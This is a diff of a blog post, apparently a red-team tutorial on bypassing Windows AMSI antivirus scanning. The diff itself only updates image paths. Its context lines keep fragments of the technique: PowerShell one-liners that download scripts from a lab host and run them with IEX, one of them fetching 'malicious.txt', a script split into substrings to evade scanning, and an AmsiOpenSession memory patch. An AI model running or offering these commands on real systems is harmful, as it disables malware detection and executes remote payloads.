@@ -143,8 +143,8 @@ but we will ignore that for today.
 Let's try to run this .ps1 version on an up to date Windows 10 running
 Windows Defender:
 
-[image1]
-![image1.png]({{site.baseurl}}/_posts/images/image1.png)
+
+![image1.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image1.png)
 
 
 As hinted previously, the script now gets caught. We will focus on
@@ -176,7 +176,7 @@ Let's get started with rejuvenating Rasta Mouses's bypass. We split our
 script into three carefully chosen parts and run them on three different
 prompts. We run a blacklisted keyword before and after.
 
-![image2.png]({{site.baseurl}}/_posts/images/image2.png)
+![image2.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image2.png)
 
 
 As shown above, the bypass doesn't get caught, and we successfully turn off
@@ -200,11 +200,11 @@ separate AMSI session. Let's demonstrate below.
 
 Just showing relevant scans, this is what we observe:
 
-![image3.png]({{site.baseurl}}/_posts/images/image3.png)
+![image3.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image3.png)
 
-![image4.png]({{site.baseurl}}/_posts/images/image4.png)
+![image4.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image4.png)
 
-![image5.png]({{site.baseurl}}/_posts/images/image5.png)
+![image5.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image5.png)
 
 
 A simplified version is shown below:
@@ -240,7 +240,7 @@ http://192.168.159.131/rastamouse/2.txt") | IEX ;
 http://192.168.159.131/rastamouse/3.txt") | IEX;
 ```
 
-![image7.png]({{site.baseurl}}/_posts/images/image7.png)
+![image7.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image7.png)
 
 
 However, downloading three separate files might not be desired.
@@ -251,13 +251,13 @@ break it down first:
 
 Our full script is saved in variable $full:
 
-![image8.png]({{site.baseurl}}/_posts/images/image8.png)
+![image8.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image8.png)
 
 
 We break the scripts into 3 substrings using a little bit of character
 counting:
 
-![image9.png]({{site.baseurl}}/_posts/images/image9.png)
+![image9.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image9.png)
 
 
 We will be running those substrings using IEX.
@@ -270,7 +270,7 @@ http://192.168.159.131/rastamouse/full.txt"); IEX($full.substring(0,591));
 IEX($full.substring(591,60)); IEX($full.substring(651,126))
 ```
 
-![image10.png]({{site.baseurl}}/_posts/images/image10.png)
+![image10.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image10.png)
 
 
 We now have a 1 liner that bypasses AMSI, with only 1 download and no
@@ -281,9 +281,9 @@ modifications to the original script.
 
 Let's peek again, after running this last 1 liner.
 
-![image11a.png]({{site.baseurl}}/_posts/images/image11a.png)
+![image11a.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image11a.png)
 
-![image11b.png]({{site.baseurl}}/_posts/images/image11b.png)
+![image11b.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image11b.png)
 
 
 A summary is below. Basically we scan the one-liner and the 3 script parts
@@ -402,7 +402,7 @@ $PowerShell2.AddScript({$command2}).Invoke();
 We show that this allows us to run our commands in separate AMSI sessions.
 Nice.
 
- ![image12.png]({{site.baseurl}}/_posts/images/image12.png)
+ ![image12.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image12.png)
 
 
 
@@ -488,7 +488,7 @@ http://192.168.159.131/rastamouse/malicious.txt")|IEX
 
 It works.
 
-![image14.png]({{site.baseurl}}/_posts/images/image14.png)
+![image14.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image14.png)
 
 
 ### AmsiOpenSession patch
@@ -537,7 +537,7 @@ $Patch =3D [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 We still have to cut the script in 3, but, surprise, it works!
 
-![image16.png]({{site.baseurl}}/_posts/images/image16.png)
+![image16.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image16.png)
 
 
 We place the script in full2.txt, do a bit of character counting, and we're
@@ -549,7 +549,7 @@ http://192.168.159.131/rastamouse/full2.txt"); IEX($full.substring(0,583));
 IEX($full.substring(583,60)); IEX($full.substring(643,126))
 ```
 
-![image17.png]({{site.baseurl}}/_posts/images/image17.png)
+![image17.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image17.png)
 
 
 
@@ -563,7 +563,7 @@ IEX($full.substring(583,60)); IEX($full.substring(643,126)); (New-Object
 Net.Webclient).downloadstring("
 http://192.168.159.131/rastamouse/malicious.txt")|IEX
 ```
-![image18.png]({{site.baseurl}}/_posts/images/image18.png)
+![image18.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image18.png)
 
 
 So what happened here? It looks like the bypass worked, since commands on
@@ -625,7 +625,7 @@ http://192.168.159.131/rastamouse/malicious.txt")|IEX}).Invoke();
 
 Let's test it. Very nice!
 
-![image19.png]({{site.baseurl}}/_posts/images/image19.png)
+![image19.png]({{ site.url }}{{ site.baseurl }}/assets/images/amsi/image19.png)
 
 
 
